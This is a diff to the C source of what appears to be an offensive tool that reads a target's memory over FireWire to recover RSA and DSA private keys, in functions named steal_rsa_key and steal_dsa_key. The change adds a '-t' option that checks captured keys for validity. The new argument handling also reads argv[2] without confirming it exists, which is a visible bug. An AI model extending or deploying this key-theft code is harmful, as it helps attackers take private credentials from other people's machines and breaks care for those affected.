@@ -52,6 +52,9 @@
 
 char pagedir[4096];
 addr_t stack_bottom = 0;
+// if test_keys = 1, we will test the captured keys on the fly.
+// this may take several seconds, depending on keytype and length!
+int test_keys = 0;
 
 #define NODE_OFFSET     0xffc0
 
@@ -323,56 +326,57 @@ int steal_rsa_key(linear_handle lin, Key* key)
 	// n,e are public key; d is private key
 
 	// check if all bignums were recovered and do some sanitychecks
-	if(key->rsa->n && key->rsa->e && key->rsa->d && key->rsa->p && key->rsa->q && key->rsa->dmp1 && key->rsa->dmq1 && key->rsa->iqmp) {{{ // sanity checks
-		int len;
-		int i;
-		int ret;
-		BN_CTX* ctx;
+	if(key->rsa->n && key->rsa->e && key->rsa->d && key->rsa->p && key->rsa->q && key->rsa->dmp1 && key->rsa->dmq1 && key->rsa->iqmp) {
+		if(test_keys) {{{ // sanity checks
+			int len;
+			int i;
+			int ret;
+			BN_CTX* ctx;
 
-		ctx = BN_CTX_new();
+			ctx = BN_CTX_new();
 
-		// is p a prime?
-		len = BN_num_bits(key->rsa->p);
-		for(i = 0; i < BN_prime_checks_for_size(len); i++) {
-			ret = BN_is_prime_fasttest_ex(key->rsa->p, BN_prime_checks, ctx, 1, NULL);
-			if(ret == 0) {
-				printf("\t\t\t"TERM_RED"(WARN)"TERM_RESET" p is not a prime!\n");
-				break;
+			// is p a prime?
+			len = BN_num_bits(key->rsa->p);
+			for(i = 0; i < BN_prime_checks_for_size(len); i++) {
+				ret = BN_is_prime_fasttest_ex(key->rsa->p, BN_prime_checks, ctx, 1, NULL);
+				if(ret == 0) {
+					printf("\t\t\t"TERM_RED"(WARN)"TERM_RESET" p is not a prime!\n");
+					break;
+				}
+				if(ret == -1) {
+					printf("\t\t\t"TERM_FAULT"(ERR)"TERM_RESET"  some strange error during test, if p is a prime\n");
+					break;
+				}
 			}
-			if(ret == -1) {
-				printf("\t\t\t"TERM_FAULT"(ERR)"TERM_RESET"  some strange error during test, if p is a prime\n");
-				break;
+			if(ret == 1)
+				printf("\t\t\t"TERM_GREEN"(ok)"TERM_RESET"   p (%d bits) seems to be a prime (after %d tests)\n", len, i);
+
+			// is q a prime?
+			len = BN_num_bits(key->rsa->q);
+			for(i = 0; i < BN_prime_checks_for_size(len); i++) {
+				ret = BN_is_prime_fasttest_ex(key->rsa->q, BN_prime_checks, ctx, 1, NULL);
+				if(ret == 0) {
+					printf("\t\t\t"TERM_RED"(WARN)"TERM_RESET" q is not a prime!\n");
+					break;
+				}
+				if(ret == -1) {
+					printf("\t\t\t"TERM_FAULT"(ERR)"TERM_RESET"  some strange error during test, if q is a prime\n");
+					break;
+				}
 			}
-		}
-		if(ret == 1)
-			printf("\t\t\t"TERM_GREEN"(ok)"TERM_RESET"   p (%d bits) seems to be a prime (after %d tests)\n", len, i);
+			if(ret == 1)
+				printf("\t\t\t"TERM_GREEN"(ok)"TERM_RESET"   q (%d bits) seems to be a prime (after %d tests)\n", len, i);
 
-		// is q a prime?
-		len = BN_num_bits(key->rsa->q);
-		for(i = 0; i < BN_prime_checks_for_size(len); i++) {
-			ret = BN_is_prime_fasttest_ex(key->rsa->q, BN_prime_checks, ctx, 1, NULL);
-			if(ret == 0) {
-				printf("\t\t\t"TERM_RED"(WARN)"TERM_RESET" q is not a prime!\n");
-				break;
-			}
-			if(ret == -1) {
-				printf("\t\t\t"TERM_FAULT"(ERR)"TERM_RESET"  some strange error during test, if q is a prime\n");
-				break;
-			}
-		}
-		if(ret == 1)
-			printf("\t\t\t"TERM_GREEN"(ok)"TERM_RESET"   q (%d bits) seems to be a prime (after %d tests)\n", len, i);
-
-		// n:
-		printf("\t\t\t(info) n is "TERM_CYAN"%d bits"TERM_RESET" long.\n",BN_num_bits(key->rsa->n));
+			// n:
+			printf("\t\t\t(info) n is "TERM_CYAN"%d bits"TERM_RESET" long.\n",BN_num_bits(key->rsa->n));
 
 
-		printf("\t\t\t" TERM_GREEN "OK." TERM_RESET "\n");
+			printf("\t\t\t" TERM_GREEN "OK." TERM_RESET "\n");
 
-		BN_CTX_free(ctx);
-
+			BN_CTX_free(ctx);
+		}}}
 		return 1;
-	}}}
+	}
 
 	// failed to recover RSA bignums...
 
@@ -458,67 +462,68 @@ int steal_dsa_key(linear_handle lin, Key* key)
 	//	pub_key = g^priv_key mod p
 
 	// check if all bignums were recovered and do some sanitychecks
-	if(key->dsa->p && key->dsa->q && key->dsa->g && key->dsa->pub_key && key->dsa->priv_key) {{{ // sanity checks
-		int len;
-		int i;
-		int ret;
-		BN_CTX* ctx;
-		BIGNUM *o,*n;
+	if(key->dsa->p && key->dsa->q && key->dsa->g && key->dsa->pub_key && key->dsa->priv_key) {
+		if(test_keys) {{{ // sanity checks
+			int len;
+			int i;
+			int ret;
+			BN_CTX* ctx;
+			BIGNUM *o,*n;
 
-		ctx = BN_CTX_new();
-		o = BN_new();
-		n = BN_new();
+			ctx = BN_CTX_new();
+			o = BN_new();
+			n = BN_new();
 
-		// p: size
-		len = BN_num_bits(key->dsa->p);
-		printf("\t\t\t(info) p is "TERM_CYAN"%d bits"TERM_RESET" long.\n", len);
-		if(len%64)
-			printf("\t\t\t"TERM_RED"(WARN)"TERM_RESET" p is not a multiple of 64 bits long! (len%%64 = %d)\n", len%64);
-		else
-			printf("\t\t\t"TERM_GREEN"(ok)"TERM_RESET"   p is a multiple of 64 bits long (64*%d)\n", len/64);
-		// p: test for prime:
-		for(i = 0; i < BN_prime_checks_for_size(len); i++) {
-			ret = BN_is_prime_fasttest_ex(key->dsa->p, BN_prime_checks, ctx, 1, NULL);
-			if(ret == 0) {
-				printf("\t\t\t"TERM_RED"(WARN)"TERM_RESET" p is not a prime!\n");
-				break;
+			// p: size
+			len = BN_num_bits(key->dsa->p);
+			printf("\t\t\t(info) p is "TERM_CYAN"%d bits"TERM_RESET" long.\n", len);
+			if(len%64)
+				printf("\t\t\t"TERM_RED"(WARN)"TERM_RESET" p is not a multiple of 64 bits long! (len%%64 = %d)\n", len%64);
+			else
+				printf("\t\t\t"TERM_GREEN"(ok)"TERM_RESET"   p is a multiple of 64 bits long (64*%d)\n", len/64);
+			// p: test for prime:
+			for(i = 0; i < BN_prime_checks_for_size(len); i++) {
+				ret = BN_is_prime_fasttest_ex(key->dsa->p, BN_prime_checks, ctx, 1, NULL);
+				if(ret == 0) {
+					printf("\t\t\t"TERM_RED"(WARN)"TERM_RESET" p is not a prime!\n");
+					break;
+				}
+				if(ret == -1) {
+					printf("\t\t\t"TERM_FAULT"(ERR)"TERM_RESET"  some strange error during test, if p is a prime\n");
+					break;
+				}
 			}
-			if(ret == -1) {
-				printf("\t\t\t"TERM_FAULT"(ERR)"TERM_RESET"  some strange error during test, if p is a prime\n");
-				break;
-			}
-		}
-		if(ret == 1)
-			printf("\t\t\t"TERM_GREEN"(ok)"TERM_RESET"   p seems to be a prime (after %d tests)\n", i);
+			if(ret == 1)
+				printf("\t\t\t"TERM_GREEN"(ok)"TERM_RESET"   p seems to be a prime (after %d tests)\n", i);
 
-		// q: size
-		len = BN_num_bits(key->dsa->q);
-		if(len != 160)
-			printf("\t\t\t"TERM_RED"(WARN)"TERM_RESET" q is not 160 bits but %d bits long!\n", len);
-		else
-			printf("\t\t\t"TERM_GREEN"(ok)"TERM_RESET"   q is 160 bits long.\n");
+			// q: size
+			len = BN_num_bits(key->dsa->q);
+			if(len != 160)
+				printf("\t\t\t"TERM_RED"(WARN)"TERM_RESET" q is not 160 bits but %d bits long!\n", len);
+			else
+				printf("\t\t\t"TERM_GREEN"(ok)"TERM_RESET"   q is 160 bits long.\n");
 
-		// pub_key:
-		BN_mod_exp(o, key->dsa->g, key->dsa->priv_key, key->dsa->p, ctx);
-		BN_sub(n, o, key->dsa->pub_key);
-		if(BN_is_zero(n))
-			printf("\t\t\t"TERM_GREEN"(ok)"TERM_RESET"   pubkey matches to parameters\n");
-		else
-			printf("\t\t\t"TERM_RED"(WARN)"TERM_RESET" pubkey does not match to parameters\n");
+			// pub_key:
+			BN_mod_exp(o, key->dsa->g, key->dsa->priv_key, key->dsa->p, ctx);
+			BN_sub(n, o, key->dsa->pub_key);
+			if(BN_is_zero(n))
+				printf("\t\t\t"TERM_GREEN"(ok)"TERM_RESET"   pubkey matches to parameters\n");
+			else
+				printf("\t\t\t"TERM_RED"(WARN)"TERM_RESET" pubkey does not match to parameters\n");
 
-		// this should suffice as a test
-		// show length of priv_key as info
-		printf("\t\t\t(info) priv_key is %d bits long (should be <= len(q))\n", BN_num_bits(key->dsa->priv_key));
+			// this should suffice as a test
+			// show length of priv_key as info
+			printf("\t\t\t(info) priv_key is %d bits long (should be <= len(q))\n", BN_num_bits(key->dsa->priv_key));
 
-		printf("\t\t\t" TERM_GREEN "OK." TERM_RESET "\n");
+			printf("\t\t\t" TERM_GREEN "OK." TERM_RESET "\n");
 
-		BN_CTX_free(ctx);
+			BN_CTX_free(ctx);
 
-		BN_free(n);
-		BN_free(o);
-
+			BN_free(n);
+			BN_free(o);
+		}}}
 		return 1;
-	}}}
+	}
 
 	// failed to recover DSA bignums...
 
@@ -749,10 +754,16 @@ int main(int argc, char**argv)
 		printf("physical handle is null\n");
 		return -2;
 	}
-	if(argc != 2) {
-		printf("please give targets nodeid\n");
+	if(argc != 2 && argc != 3) {
+		printf("please give targets nodeid as first parameter;\n"
+		       "you may give -t as second parameter to test captured keys for validity\n"
+		       "(may increase attack-time by several seconds)\n");
 		return -1;
 	}
+
+	if(0 == strcmp(argv[2], "-t"))
+		test_keys = 1;
+
 	phy_data.ieee1394.raw1394handle = raw1394_new_handle();
         if(!phy_data.ieee1394.raw1394handle) {
                 printf("failed to open raw1394\n");
